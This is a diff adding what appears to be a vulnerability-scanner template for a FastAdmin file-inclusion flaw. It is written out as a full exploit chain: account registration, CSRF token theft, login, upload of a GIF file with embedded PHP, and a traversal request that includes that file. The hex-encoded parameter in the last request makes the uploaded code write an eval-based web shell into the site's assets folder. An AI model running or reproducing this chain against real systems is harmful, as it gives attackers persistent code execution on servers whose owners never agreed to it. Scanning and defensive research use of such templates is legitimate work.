@@ -1,0 +1,132 @@
+id: fastadmin-empty-method-file-include
+
+info:
+  name: FastAdmin _empty Method File Inclusion Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    FastAdmin before version v1.0.0.20200506 contains a file inclusion vulnerability in the `_empty` method. Attackers can include uploaded files or logs, execute arbitrary code, and gain server permissions.
+  tags: file-inclusion
+  reference:
+    - https://github.com/karsonzhang/fastadmin/releases/tag/v1.0.0.20190705_beta
+
+http:
+  - id: register-user
+    method: POST
+    path:
+      - "{{BaseURL}}/index.php/api/user/register"
+    headers:
+      Cookie: PHPSESSID=rvitsn3e1lbbcab8h5gccalah8
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      username=fastadmin_2020&password=admin@123&email=&mobile=
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - '{"code":1,"msg":"注册成功"'
+      - type: word
+        words:
+          - '{"code":0,"msg":"用户名已经存"'
+
+  - id: extract-token
+    method: GET
+    path:
+      - "{{BaseURL}}/index.php/index/user/login"
+    headers:
+      Cookie: PHPSESSID=rvitsn3e1lbbcab8h5gccalah8
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "__token__"
+    extractors:
+      - type: regex
+        name: csrf_token
+        internal: true
+        group: 1
+        regex:
+          - '__token__" value="(.*?)"'
+
+  - id: login-user
+    method: POST
+    path:
+      - "{{BaseURL}}/index.php/index/user/login"
+    headers:
+      Cookie: PHPSESSID=rvitsn3e1lbbcab8h5gccalah8
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      __token__={{csrf_token}}&account=fastadmin_2020&password=admin%40123&keeplogin=1
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "Set-Cookie: token="
+    extractors:
+      - type: regex
+        name: session_token
+        internal: true
+        group: 1
+        regex:
+          - 'token=(.*?);'
+
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/index.php/index/ajax/upload"
+    headers:
+      Cookie: PHPSESSID=rvitsn3e1lbbcab8h5gccalah8; token={{session_token}}
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundarypT3Bbj7EGhdhhZH0
+    body: |
+      ------WebKitFormBoundarypT3Bbj7EGhdhhZH0
+      Content-Disposition: form-data; name="file"; filename="a.gif"
+      Content-Type: png
+
+      GIF89aaaaaaa<?php echo md5(123);if(isset($_REQUEST['code'])){file_put_contents('./assets/fastadmin_test_2020.php',hex2bin($_REQUEST['code']));}?>aaaa
+      ------WebKitFormBoundarypT3Bbj7EGhdhhZH0--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '{"code":1,"msg":"上传成功"'
+    extractors:
+      - type: regex
+        name: upload_date
+        internal: true
+        group: 1
+        regex:
+          - '/([\d]{1,8})/'
+      - type: regex
+        name: upload_filename
+        internal: true
+        group: 1
+        regex:
+          - '/([\w]{1,32})\.gif'
+
+  - id: trigger-file-include
+    method: POST
+    path:
+      - "{{BaseURL}}/index.php/index/user/_empty"
+    headers:
+      Cookie: PHPSESSID=rvitsn3e1lbbcab8h5gccalah8; token={{session_token}}
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      name=../uploads/{{upload_date}}/{{upload_filename}}.gif&code=3c3f70687020406576616c28245f524551554553545b27696d67275d293b3f3e
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "202cb962ac59075b964b07152d234b70"
